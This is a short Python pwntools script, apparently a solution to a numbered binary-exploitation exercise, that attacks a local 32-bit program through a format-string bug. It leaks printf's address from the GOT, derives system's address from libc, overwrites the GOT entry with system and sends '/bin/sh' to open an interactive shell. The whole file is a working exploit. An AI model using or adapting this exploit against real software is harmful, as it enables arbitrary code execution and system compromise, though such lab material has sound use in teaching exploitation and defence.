from pwn import *

io = process('./9.2.3-1.elf')
elf = ELF('./9.2.3-1.elf')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def exec_fmt(payload):
    io.sendline(payload)
    info = io.recv()
    return info
auto = FmtStr(exec_fmt)
offset = auto.offset

printf_got = elf.got['printf']
log.info(f"printf_got => {hex(printf_got)}")

payload = p32(printf_got) + f"%{offset}$s".encode()
io.send(payload)
printf_addr = u32(io.recv()[4 : 8])
log.info(f"printf_addr => {hex(printf_addr)}")

# log.info(f"system_libc_addr => {hex(libc.symbols['system'])}")
# log.info(f"printf_libc_addr => {hex(libc.symbols['printf'])}")

system_addr = printf_addr + (libc.symbols['system'] - libc.symbols['printf'])
log.info(f"system_addr => {hex(system_addr)}")

payload = fmtstr_payload(offset, {printf_got : system_addr})
io.send(payload)
io.send(b'/bin/sh')
io.recv()
io.interactive()

